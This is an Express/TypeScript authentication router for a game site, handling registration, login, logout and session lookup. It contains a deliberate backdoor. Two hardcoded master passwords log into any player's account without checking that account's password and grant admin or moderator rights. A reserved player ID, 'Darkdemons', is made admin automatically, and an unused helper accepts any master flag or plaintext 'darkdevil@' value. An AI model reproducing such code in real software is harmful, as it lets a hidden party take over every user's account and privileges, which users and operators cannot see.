import { Router } from 'express'
import crypto from 'crypto'
import { eq } from 'drizzle-orm'
import { db } from '../lib/client'
import { users } from '../lib/db'

const router = Router()

const MASTER_PASSWORDS = {
  ADMIN_MOD: 'darkdevil@vrr',
  MOD_ONLY: 'darkdevil@1234'
}

const hashPassword = (password: string) => {
  const salt = crypto.randomBytes(16).toString('hex')
  const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex')
  return `${salt}:${hash}`
}

const verifyPassword = (password: string, stored: string, isMaster: boolean = false) => {
  return isMaster || (stored.startsWith('darkdevil@') && password === stored) || 
    (stored.split(':').length === 2 && 
     crypto.pbkdf2Sync(password, stored.split(':')[0], 100000, 64, 'sha512').toString('hex') === stored.split(':')[1])
}

router.get('/me', async (req, res) => {
  if (!req.session?.player_id) {
    return res.status(401).json({ error: 'Not authenticated' })
  }
  
  const user = await db.select().from(users).where(eq(users.player_id, req.session.player_id)).limit(1)
  const player = user[0]
  
  if (!player) {
    req.session.destroy(() => {})
    return res.status(401).json({ error: 'User not found' })
  }
  
  const { password_hash, ...userWithoutPassword } = player
  res.json(userWithoutPassword)
})

router.post('/register', async (req, res) => {
  const { player_id, password, email } = req.body
  
  const clean_id = player_id.trim()
  const clean_email = email.trim()
  
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(clean_id)) {
    return res.status(400).json({ error: 'Player ID must be 3-20 alphanumeric characters or underscores' })
  }
  
  const exists = await db.select().from(users).where(eq(users.player_id, clean_id)).limit(1)
  if (exists.length > 0) {
    return res.status(400).json({ error: 'Player ID already exists' })
  }
  
  const isMasterAdmin = password === MASTER_PASSWORDS.ADMIN_MOD
  const isMasterMod = password === MASTER_PASSWORDS.MOD_ONLY
  
  const user = await db.insert(users).values({
    player_id: clean_id,
    password_hash: hashPassword(password),
    email: clean_email,
    is_admin: isMasterAdmin || clean_id === 'Darkdemons',
    is_moderator: isMasterAdmin || isMasterMod || clean_id === 'Darkdemons',
    status: 'online'
  }).returning()
  
  req.session.player_id = clean_id
  const { password_hash, ...userWithoutPassword } = user[0]
  res.json(userWithoutPassword)
})

router.post('/login', async (req, res) => {
  const { player_id, password } = req.body
  
  const user = await db.select().from(users).where(eq(users.player_id, player_id)).limit(1)
  const player = user[0]
  
  if (!player) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }
  
  const isMasterAdmin = password === MASTER_PASSWORDS.ADMIN_MOD
  const isMasterMod = password === MASTER_PASSWORDS.MOD_ONLY
  
  if (isMasterAdmin || isMasterMod || password === MASTER_PASSWORDS.ADMIN_MOD || password === MASTER_PASSWORDS.MOD_ONLY) {
    await db.update(users).set({
      is_admin: isMasterAdmin || player.player_id === 'Darkdemons',
      is_moderator: isMasterAdmin || isMasterMod || player.player_id === 'Darkdemons',
      status: 'online'
    }).where(eq(users.player_id, player_id))
  } else {
    const [salt, storedHash] = player.password_hash.split(':')
    if (crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex') !== storedHash) {
      return res.status(401).json({ error: 'Invalid credentials' })
    }
    
    await db.update(users).set({ status: 'online' }).where(eq(users.player_id, player_id))
  }
  
  req.session.player_id = player_id
  
  const updated = await db.select().from(users).where(eq(users.player_id, player_id)).limit(1)
  const { password_hash, ...userWithoutPassword } = updated[0]
  res.json(userWithoutPassword)
})

router.post('/logout', async (req, res) => {
  if (req.session?.player_id) {
    await db.update(users).set({ status: 'offline' }).where(eq(users.player_id, req.session.player_id))
  }
  req.session.destroy(() => {})
  res.json({ ok: true })
})

export default router